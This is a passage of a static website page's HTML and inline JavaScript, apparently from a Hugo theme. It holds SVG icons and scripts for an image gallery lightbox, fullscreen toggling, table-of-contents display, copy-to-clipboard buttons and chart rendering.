                          d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z" />
                      </svg>
                    </div>
                    <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen"
                      aria-label="Full Screen Button">
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25">
                        <path fill="currentColor"
                          d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z" />
                      </svg>
                    </div>
                    <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen"
                      aria-label="Normal Screen Button">
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25">
                        <path fill="currentColor"
                          d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z" />
                      </svg>
                    </div>
                  </span>

                  <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left"
                    aria-label="Arrow Left Button">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28">
                      <path fill="currentColor"
                        d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z" />
                    </svg>
                  </div>

                  <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right"
                    aria-label="Arrow Right Button">

                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28">
                      <path fill="currentColor"
                        d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z" />
                    </svg>
                  </div>

                  <div class="modal__caption">
                    <div class="modal__caption--text">
                    </div>
                  </div>

                </span>
              </div>
            </div>
          </div>

          <script defer src="../../js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js">
          </script>

          <script defer
            src="../../js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

          <script defer src="../../js/fadeinout.min.js"></script>

          <script>
            document.addEventListener('DOMContentLoaded', function () {

              var docElem = document.documentElement;

              function openFullscreen() {
                if (docElem.requestFullscreen) {
                  docElem.requestFullscreen();
                } else if (docElem.mozRequestFullScreen) {
                  docElem.mozRequestFullScreen();
                } else if (docElem.webkitRequestFullscreen) {
                  docElem.webkitRequestFullscreen();
                } else if (docElem.msRequestFullscreen) {
                  docElem.msRequestFullscreen();
                }
              }

              function closeFullscreen() {
                if (document.fullscreenElement ||
                  document.webkitFullscreenElement ||
                  document.mozFullScreenElement) {
                  if (document.exitFullscreen) {
                    document.exitFullscreen();
                  } else if (document.mozCancelFullScreen) {
                    document.mozCancelFullScreen();
                  } else if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen();
                  } else if (document.msExitFullscreen) {
                    document.msExitFullscreen();
                  }
                }
              }

              var modal = document.getElementById('modal');
              var galleryContainerElem = document.querySelector('.gallery__container');
              var swipeWrapElem = document.querySelector('.swipe-wrap');
              var mySwipeElem = document.getElementById('mySwipe');
              var arrowLeftElem = document.querySelector('.modal__arrow--left');
              var arrowRightElem = document.querySelector('.modal__arrow--right');
              var closeElem = document.querySelector('.modal__toolbar--close');
              var fullElem = document.querySelector('.modal__toolbar--full');
              var normalElem = document.querySelector('.modal__toolbar--normal');
              var captionElem = document.querySelector('.modal__caption');
              var pagingElem = document.querySelector('.modal__paging');
              var itemsElem = document.querySelector('.modal__items');
              var imgTotalNum = null;
              var myFadeTimeout = null;
              var mySwipe = null;
              var keydownFunction = function (e) {
                if (e.key === 'ArrowRight') {
                  if (modal && modal.classList.contains('is-open')) {
                    mySwipe.next();
                  }
                } else if (e.key === 'ArrowLeft') {
                  if (modal && modal.classList.contains('is-open')) {
                    mySwipe.prev();
                  }
                }
              }

              if (galleryContainerElem) {
                imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
              } else {
                galleryContainerElem = document.querySelector('.single__contents');
                imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
              }

              MicroModal.init({
                onClose: function () {
                  if (mySwipe) {
                    mySwipe.kill();
                    mySwipe = null;
                    closeFullscreen();
                  }
                  window.removeEventListener('keydown', keydownFunction);
                },
                disableScroll: true,
                disableFocus: true,
                awaitOpenAnimation: false,
                awaitCloseAnimation: false,
                debugMode: false,
              });

              var imageLoad = function (src) {
                return new Promise(function (resolve, reject) {
                  var newImg = new Image;
                  newImg.onload = function () {
                    resolve(newImg);
                  }
                  newImg.onerror = reject;
                  newImg.src = src;
                });
              }

              galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
                elem.style.cursor = 'x'; //no pointer

                var clonedElem = elem.cloneNode(true);
                clonedElem.style.maxHeight = '100%';
                clonedElem.style.maxWidth = '100%';
                clonedElem.onclick = function (e) {
                  e.stopPropagation();
                }

                var wrapper = document.createElement('div');
                wrapper.style.width = '100%';
                wrapper.style.height = '100vh';
                wrapper.setAttribute('data-micromodal-close', '');
                wrapper.onclick = function () {
                  if (mySwipe) {
                    mySwipe.kill();
                    mySwipe = null;
                  }
                }
                wrapper.onmouseenter = function () {
                  clearTimeout(myFadeTimeout);
                  fadeIn(itemsElem, 200);
                };
                wrapper.onmouseleave = function () {
                  myFadeTimeout = setTimeout(function () {
                    fadeOut(itemsElem, 200);
                  }, 2500);
                }
                wrapper.ontouchstart = function () {
                  fadeIn(itemsElem, 200);
                }
                wrapper.append(clonedElem);
                swipeWrapElem.append(wrapper);

                elem.addEventListener('click', async function (e) {
                  MicroModal.show('modal');
                  if (mySwipe) {
                    mySwipe.kill();
                    mySwipe = null;
                  }

                  var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
                  var img = await imageLoad(imgSrc);
                  clonedElem.style.width = img.width + 'px';
                  clonedElem.style.height = img.height + 'px';

                  mySwipe = new Swipe(mySwipeElem, {
                    startSlide: idx,
                    draggable: true,
                    autoRestart: false,
                    continuous: false,
                    disableScroll: true,
                    stopPropagation: true,
                    callback: async function (index, element) {

                      var imgElem = element.querySelector('img');
                      var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
                      var img = await imageLoad(imgSrc);
                      imgElem.style.width = img.width + 'px';
                      imgElem.style.height = img.height + 'px';

                      if (captionElem && imgElem) {
                        var caption = null;
                        if (imgElem.getAttribute('data-caption')) {
                          caption = imgElem.getAttribute('data-caption');
                        } else if (imgElem.getAttribute('title')) {
                          caption = imgElem.getAttribute('title');
                        } else if (imgElem.getAttribute('alt')) {
                          caption = imgElem.getAttribute('alt');
                        } else {
                          caption = imgElem.getAttribute('src');
                        }

                        captionElem.querySelector('.modal__caption--text').innerText = caption;
                        pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

                        clearTimeout(myFadeTimeout);
                        fadeIn(itemsElem, 200);
                      }
                    },
                  });

                  fadeIn(itemsElem);

                  if (captionElem) {
                    var caption = null;
                    if (e.target.getAttribute('data-caption')) {
                      caption = e.target.getAttribute('data-caption');
                    } else if (e.target.getAttribute('title')) {
                      caption = e.target.getAttribute('title');
                    } else if (e.target.getAttribute('alt')) {
                      caption = e.target.getAttribute('alt');
                    } else {
                      caption = e.target.getAttribute('src');
                    }

                    captionElem.querySelector('.modal__caption--text').innerText = caption;
                    pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
                  }

                  if (normalElem && fullElem) {
                    normalElem.style.zIndex = -1;
                    normalElem.style.opacity = 0;
                    fullElem.style.zIndex = 25;
                    fullElem.style.opacity = 1;
                  }
                });

                window.addEventListener('keydown', keydownFunction);
              });

              arrowLeftElem ?
                arrowLeftElem.addEventListener('click', function (e) {
                  if (mySwipe) {
                    mySwipe.prev();
                  }
                }) : null;
              arrowRightElem ?
                arrowRightElem.addEventListener('click', function (e) {
                  if (mySwipe) {
                    mySwipe.next();
                  }
                }) : null;

              closeElem ?
                closeElem.addEventListener('click', function () {
                  if (mySwipe) {
                    mySwipe.kill();
                    mySwipe = null;
                  }
                  closeFullscreen();
                  MicroModal.close('modal');
                }) : null;

              fullElem ?
                fullElem.addEventListener('click', function (e) {
                  openFullscreen();
                  if (normalElem) {
                    normalElem.style.zIndex = 25;
                    normalElem.style.opacity = 1;
                    fullElem.style.zIndex = -1;
                    fullElem.style.opacity = 0;
                  }
                }) : null;

              normalElem ?
                normalElem.addEventListener('click', function (e) {
                  closeFullscreen();
                  if (fullElem) {
                    fullElem.style.zIndex = 25;
                    fullElem.style.opacity = 1;
                    normalElem.style.zIndex = -1;
                    normalElem.style.opacity = 0;
                  }
                }) : null;

            });
          </script>

          <div class="hide">
            <div class="search">
              <span class="icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24">
                  <path fill="none" d="M0 0h24v24H0V0z" />
                  <path
                    d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
                </svg>
              </span>
              <input id="search" aria-label="Site Search" class="input" type="text" placeholder="Buscar"
                autocomplete="off">
              <div id="search-results" class="dropdown">
                <div id="search-menu" class="dropdown-menu" role="menu">
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <script>
        var enableToc = JSON.parse("true");
        var toc = JSON.parse("null");
        var tocPosition = JSON.parse("\"outer\"");

        var singleMainElem = document.querySelector('.single__main');
        var singleSideElem = document.querySelector('.single__side');

        enquire.register("screen and (max-width: 769px)", {
          match: function () {
            if ((enableToc || toc) && tocPosition !== "outer") {
              if (singleMainElem && singleSideElem) {
                singleMainElem.classList.remove('main-main');
                singleMainElem.classList.add('main');
                singleSideElem.classList.remove('main-side');
                singleSideElem.classList.add('hide');
              }
            } else if (tocPosition === "outer") {
              if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
                singleMainElem.classList.remove('main-main');
                singleMainElem.classList.add('main');
              }
              if (singleSideElem && !singleSideElem.classList.contains('hide')) {
                singleSideElem.classList.add('hide');
              }
            }
          },
          unmatch: function () {
            if ((enableToc || toc) && tocPosition !== "outer") {
              singleMainElem.classList.remove('main');
              singleMainElem.classList.add('main-main');
              singleSideElem.classList.remove('hide');
              singleSideElem.classList.add('main-side');
            } else if (tocPosition === "outer") {
              if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
                singleMainElem.classList.remove('main-main');
                singleMainElem.classList.add('main');
              }
              if (singleSideElem && !singleSideElem.classList.contains('hide')) {
                singleSideElem.classList.add('hide');
              }
            }

            var navCollapseBtn = document.querySelector('.navbar__burger');
            var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
            if (navCollapse) {
              navCollapse.setAttribute('data-open', false);
              navCollapse.style.maxHeight = 0;
              navCollapseBtn.classList.remove('is-active');
            }
            document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
            document.getElementsByClassName('mobile-search')[0].classList.add('hide');
          },
          setup: function () {},
          deferSetup: true,
          destroy: function () {},
        });
      </script>

      <script defer src="../../js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js">
      </script>

      <script defer src="../../js/getParents.min.js"></script>

      <script defer src="../../js/closest.min.js"></script>

      <script defer src="../../js/prev.min.js"></script>

      <script defer src="../../js/prop.min.js"></script>

      <script defer src="../../js/fadeinout.min.js"></script>

      <script defer src="../../../cdn.jsdelivr.net/npm/chart.js%402.9.3/dist/Chart.min.js"
        integrity="sha256-R4pqcOYV8lt7snxMQO/HSbVCFRPMdrhAFMH&#43;vr9giYI=" crossorigin="anonymous"></script>

      <script>
        'use strict';

        window.onload = function () {
          var navbar = document.querySelector('.navbar');
          var singleContentsElem = document.querySelector('.single__contents');

          var enableBusuanzi = JSON.parse("false");
          var busuanziPagePV = JSON.parse("true");

          if (enableBusuanzi && busuanziPagePV) {
            var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
            pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
          }

          var enableToc = JSON.parse("true");
          var toc = JSON.parse("null");
          var hideToc = JSON.parse("false");
          var tocFlexbox = document.querySelector('.toc__flexbox');
          var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
          var tocFolding = JSON.parse("null");

          if ((enableToc || toc) && document.querySelector('.toc')) {
            var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

            if (false === tocFolding) {

            } else {
              tableOfContentsElem.querySelectorAll('ul') ?
                tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                  rootUl.querySelectorAll('li').forEach(function (liElem) {
                    liElem.querySelectorAll('ul').forEach(function (ulElem) {
                      ulElem.style.display = 'none';
                    });
                  });
                }) : null;
            }

            if (tableOfContentsElem) {
              if (tableOfContentsElem.querySelectorAll('a').length > 0) {
                tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
                  elem.addEventListener('click', function () {
                    var id = elem.getAttribute('id');
                    navbar.classList.remove('navbar--show');
                    navbar.classList.remove('navbar--hide');
                    navbar.classList.add('navbar--hide');

                    document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                      elem.classList.remove('active');
                    });
                    elem.classList.add('active');

                    var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
                    if (curElem && curElem.nextElementSibling) {
                      curElem.nextElementSibling.style.display = 'block';
                    }
                    if (curElem) {
                      getParents(curElem, 'ul') ?
                        getParents(curElem, 'ul').forEach(function (elem) {
                          elem.style.display = 'block';
                        }) : null;
                    }
                  });
                });
              } else {
                if (tocFlexbox) {
                  tocFlexbox.setAttribute('data-position', '');
                  if (!tocFlexbox.classList.contains('hide')) {
                    tocFlexbox.classList.add('hide');
                  }
                }
                if (tocFlexboxOuter) {
                  tocFlexboxOuter.setAttribute('data-position', '');
                  if (!tocFlexboxOuter.classList.contains('hide')) {
                    tocFlexboxOuter.classList.add('hide');
                  }
                }
              }
            }

            var toggleTocElem = document.getElementById("toggle-toc");
            var visibleTocElem = document.getElementById('visible-toc');
            var tocElem = document.querySelector('.toc');
            var mainElem = document.querySelector('main');
            var sideElem = document.querySelector('side');
            var tocFlexboxElem = document.querySelector('.toc__flexbox');

            toggleTocElem ?
              toggleTocElem.addEventListener('change', function (e) {
                if (e.target.checked) {
                  if (tocElem) {
                    fadeIn(tocElem, 200);
                  }
                  if (tocFlexboxElem) {
                    tocFlexboxElem.setAttribute('data-position', 'fixed');
                  }

                  if (mainElem) {
                    mainElem.classList.remove('main-main');
                    mainElem.classList.remove('main');
                    mainElem.classList.add('main-main');
                  }
                  if (sideElem) {
                    sideElem.classList.remove('main-side');
                  }
                } else {
                  if (tocElem) {
                    fadeOut(tocElem, 200);
                  }
                  if (tocFlexboxElem) {
                    tocFlexboxElem.setAttribute('data-position', 'absolute');
                  }

                  if (mainElem) {
                    mainElem.classList.remove('main-main');
                    mainElem.classList.remove('main');
                    mainElem.classList.add('main');
                  }
                  if (sideElem) {
                    sideElem.classList.remove('main-side');
                  }
                }
              }) : null;

            visibleTocElem ?
              visibleTocElem.addEventListener('change', function (e) {
                if (e.target.checked) {
                  if (tocElem) {
                    fadeIn(tocElem, 200);
                  }
                } else {
                  if (tocElem) {
                    fadeOut(tocElem, 200);
                  }
                }
              }) : null;
          }

          var tables = document.querySelectorAll('.single__contents > table');
          for (let i = 0; i < tables.length; i++) {
            var table = tables[i];
            var wrapper = document.createElement('div');
            wrapper.className = 'table-wrapper';
            table.parentElement.replaceChild(wrapper, table);
            wrapper.appendChild(table);
          }

          var text, clip = new ClipboardJS('.anchor');
          var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

          var languagedir = JSON.parse("\"ltr\"");

          headers ?
            headers.forEach(function (elem) {
              var url = encodeURI(document.location.origin + document.location.pathname);
              var link = url + "#" + elem.getAttribute('id');
              var newElemOuter = document.createElement('span');
              newElemOuter.classList.add('anchor');
              newElemOuter.classList.add('hide');
              newElemOuter.setAttribute('data-clipboard-text', link);
              newElemOuter.style.position = 'relative';

              var newElemInner = document.createElement('span');
              newElemInner.style.fontSize = '1rem';
              newElemInner.style.position = 'absolute';
              newElemInner.style.top = '50%';
              newElemInner.style.transform = 'translateY(-50%)';
              newElemInner.innerText = "🔗";

              if (languagedir === "rtl") {
                newElemInner.style.left = '-2rem';
              } else {
                newElemInner.style.right = '-2rem';
              }

              newElemOuter.append(newElemInner);
              elem.append(newElemOuter);

              elem.addEventListener('mouseenter', function () {
                this.querySelector('.anchor').classList.remove('hide');
              });
              elem.addEventListener('mouseleave', function () {
                this.querySelector('.anchor').classList.add('hide');
              });
            }) : null;

          document.querySelectorAll('.anchor').forEach(function (elem) {
            elem.addEventListener('mouseleave', function () {
              elem.setAttribute('aria-label', null);
              elem.classList.remove('tooltipped');
              elem.classList.remove('tooltipped-s');
              elem.classList.remove('tooltipped-w');
            });
          });

          clip.on('success', function (e) {
            e.clearSelection();
            e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-s');
          });

          var clipInit = false;
          var preChromaElem = document.querySelectorAll('pre.chroma');
          var langCodeElem = document.querySelectorAll('.language-code');
          var dollarCodeElem = document.querySelectorAll('div.language-\\$');
          var gtCodeElem = document.querySelectorAll('div.language-\\>');

          var makeClipboard = function (elem) {
            var code = elem,
              text = elem.textContent;

            if (text.length > 15) {
              if (!clipInit) {
                var text, clip = new ClipboardJS('.copy-to-clipboard', {
                  text: function (trigger) {
                    var codeElem = prev(trigger).querySelectorAll('code');
                    if (codeElem.length > 1) {
                      text = prev(trigger).querySelector('code[class^="language-"]').textContent;
                    } else {
                      text = prev(trigger).querySelector('code').textContent;
                    }

                    return text.replace(/^\$\s/gm, '');
                  }
                });

                var inPre;
                clip.on('success', function (e) {
                  e.clearSelection();
                  inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
                  e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
                  e.trigger.classList.add('tooltipped');
                  e.trigger.classList.add('tooltipped-w');
                });

                clip.on('error', function (e) {
                  inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
                  e.trigger.setAttribute('aria-label', e.action.toString());
                  e.trigger.classList.add('tooltipped');
                  e.trigger.classList.add('tooltipped-w');
                });

                clipInit = true;
              }

              var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart',
                'language-msc', 'language-flowchart'
              ];
              var isNotAllowedIncluded = false;
              var curClassName = code.getAttribute('class');

              for (var i = 0; i < notAllowedClass.length; i++) {
                if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
                  isNotAllowedIncluded = true;
                  break;
                }
              }

              if (!isNotAllowedIncluded) {
                if (curClassName) {
                  var newClipboardElem = document.createElement('span');
                  newClipboardElem.setAttribute('class', 'copy-to-clipboard');
                  newClipboardElem.setAttribute('title', 'Copy to clipboard');
                  elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
                }
              }
            }
          }

          var makeSymbolClipboard = function (elem) {
            var clipboardSpan = document.createElement('span');
            clipboardSpan.setAttribute('class', 'copy-to-clipboard');
            clipboardSpan.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
          }

          preChromaElem ?
            preChromaElem.forEach(function (elem) {
              elem.querySelectorAll('code').forEach(function (codeElem) {
                makeClipboard(codeElem);
              });
            }) : null;

          langCodeElem ?
            langCodeElem.forEach(function (elem) {
              elem.querySelectorAll('code').forEach(function (codeElem) {
                makeClipboard(codeElem);
              });
            }) : null;

          dollarCodeElem ?
            dollarCodeElem.forEach(function (elem) {
              elem.querySelectorAll('code').forEach(function (codeElem) {
                makeSymbolClipboard(codeElem);
              });
            }) : null;

          gtCodeElem ?
            gtCodeElem.forEach(function (elem) {
              elem.querySelectorAll('code').forEach(function (codeElem) {
                makeSymbolClipboard(codeElem);
              });
            }) : null;

          dollarCodeElem ?
            dollarCodeElem.forEach(function (elem) {
              var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
              lnts ?
                lnts.forEach(function (lnt) {
                  lnt.innerHTML = '$<br/>';
                }) : null;
            }) : null;

          gtCodeElem ?
            gtCodeElem.forEach(function (elem) {
              var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
              lnts ?
                lnts.forEach(function (lnt) {
                  lnt.innerHTML = '><br/>';
                }) : null;
            }) : null;

          var lib = JSON.parse("[\"chart\"]");

          if (lib && lib.includes('mermaid')) {

            var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

            if (themeVariant === "dark" || themeVariant === "hacker") {
              mermaid.initialize({
                theme: 'dark'
              });
            } else {
              mermaid.initialize({
                theme: 'default'
              });
            }

            var mermaids = [];
            [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
            mermaids.forEach(function (elem) {
              var elemParentNode = elem.parentNode;

              if (elemParentNode !== document.body) {
                elemParentNode.parentNode.insertBefore(elem, elemParentNode);
                elemParentNode.parentNode.removeChild(elemParentNode);
              }

              var newElemWrapper = document.createElement('div');
              newElemWrapper.classList.add('mermaid');
              newElemWrapper.style.padding = '34px 4px 6px';
              newElemWrapper.innerHTML = elem.innerHTML;
              elem.replaceWith(newElemWrapper);
            });
          }

          if (lib && lib.includes('katex')) {
            var mathElements = document.getElementsByClassName('math');
            var options = {
              delimiters: [{
                  left: "$$",
                  right: "$$",
                  display: true
                },
                {
                  left: "\\[",
                  right: "\\]",
                  display: true
                },
                {
                  left: "$",
                  right: "$",
                  display: false
                },
                {
                  left: "\\(",
                  right: "\\)",
                  display: false
                }
              ],
            };

            renderMathInElement(document.querySelector('.single__contents'), options);
          }

          if (lib && lib.includes('flowchartjs')) {

            var options = JSON.parse(
              "{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}"
            );
            var jsonContent = null;

            var flowchartPrefix = "language-flowchart";
            var index = 0;
            Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function (x) {
              x.style.display = 'none'
              x.parentNode.style.backgroundColor = "transparent"
              jsonContent = x.innerText;

              var node0 = document.createElement('div');
              node0.id = 'flowchart' + index;
              x.parentNode.insertBefore(node0, x);

              var diagram = flowchart.parse(jsonContent);
              diagram.drawSVG("flowchart" + index, options);

              index += 1;
            });
          }

          if (lib && lib.includes('msc')) {

            var options = JSON.parse("{\"theme\":\"hand\"}");
            var jsonContent = null;

            var index = 0;
            var chartPrefix = "language-msc";
            Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
              x.style.display = 'none'
              x.parentNode.style.backgroundColor = "transparent"
              jsonContent = x.innerText;
              var node0 = document.createElement('div');
              node0.id = 'msc' + index;
              x.parentNode.insertBefore(node0, x);
              var diagram = Diagram.parse(jsonContent);
              diagram.drawSVG("msc" + index, options);
              index += 1;
            });
          }

          if (lib && lib.includes('chart')) {
            var borderColor = "rgba(0,0,0,0)";
            var bgColor = "rgba(0,0,0,0)  ";
            var borderWidth = 2;

            Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
            Chart.defaults.global.elements.rectangle.borderColor = borderColor;
            Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

            Chart.defaults.global.elements.line.borderWidth = borderWidth;
            Chart.defaults.global.elements.line.borderColor = borderColor;
            Chart.defaults.global.elements.line.backgroundColor = bgColor;

            Chart.defaults.global.elements.point.borderWidth = borderWidth;
            Chart.defaults.global.elements.point.borderColor = borderColor;
            Chart.defaults.global.elements.point.backgroundColor = bgColor;

            var chartPrefix = "language-chart";
            var index = 0;
            var jsonContent = null;

            Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
              x.style.display = 'none'
              x.parentNode.style.backgroundColor = "transparent"
              jsonContent = x.innerText;
              var node0 = document.createElement('canvas');
              var source = null;
              node0.height = 200;
              node0.style.height = 200;
              node0.id = 'myChart' + index;
              source = JSON.parse(jsonContent);
              x.parentNode.insertBefore(node0, x);
              var ctx = document.getElementById('myChart' + index).getContext('2d');
